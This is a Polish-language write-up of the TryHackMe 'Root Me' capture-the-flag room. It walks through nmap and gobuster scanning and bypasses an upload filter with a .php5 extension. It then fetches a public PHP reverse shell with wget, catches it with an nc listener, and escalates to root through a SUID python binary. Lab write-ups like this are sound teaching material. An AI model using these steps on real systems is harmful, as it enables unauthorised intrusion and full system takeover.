
# TryHackMe „Root me”

## 1. Informacje ogólne
Pokój Root Me wprowadza w praktyczne podstawy atakowania aplikacji webowych: od enumeracji usług, przez analizę podatności,  
aż po zdobycie pierwszego dostępu do systemu.  
Kończy się prostą eskalacją uprawnień, która pokazuje, jak błędne konfiguracje i słabe zabezpieczenia mogą prowadzić do pełnego przejęcia maszyny.  

---

## 2. Metodologia 
 **Narzędzia:** nmap ,gobuster, nc
 
## 3. Podsumowanie zadania
  **Skanowanie wstępne:**
  
### Nmap:
```bash
sudo nmap -sV -sS -p- -A 10.80.183.80
```

### Gobuster:

```bash
gobuster dir -u 10.80.183.80 -w /usr/share/wordlists/dirb/common.txt
```

Po ptrzymaniu ukrutego katalogu na stronie dostajemy mozliwosc wysłania pliku
Szukamy metody wysłania pliku aby otrzymac reverse shell
Sprawdzamy różne pliki i okazuje się że można wysyłac pliki .php.php5 -dodatkwoe rozszerzenie php - wikipedia ( samo .php jest blokowane)
Wchodzimu do znalezionego przez gobuser katalogu uploads i sprawdzamy zawartość.

Pobieramy kod na reverse shell php i toworzymy plik payload
```bash
wget https://gist.githubusercontent.com/rshipp/eee36684db07d234c1cc/raw/9907b98ec63c6ad9bf5f39d14d07d9a3765f9079/shell.php
```

Otwieramy plik i ustawiamy ip maszyny lokalnej

Wysyłamy plik na serwer i nasłuchujemy 
### Netcad: 

Ustawiamy port taki jak w pliku .php5
```bash
nc -lvnp 1234
```

przechodzimy cd ~ , ls , cat user.txt

Teraz próbujemy eskalowac do konta root
```bash
 find /-user root-perm /4000
```

Otrzymujemy :
/usr/bin/python2.7

Szukamy reveresheel dla python 

Wklejamy:  
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Otrzymujemy uprawnienia root i dostajemy flagę.
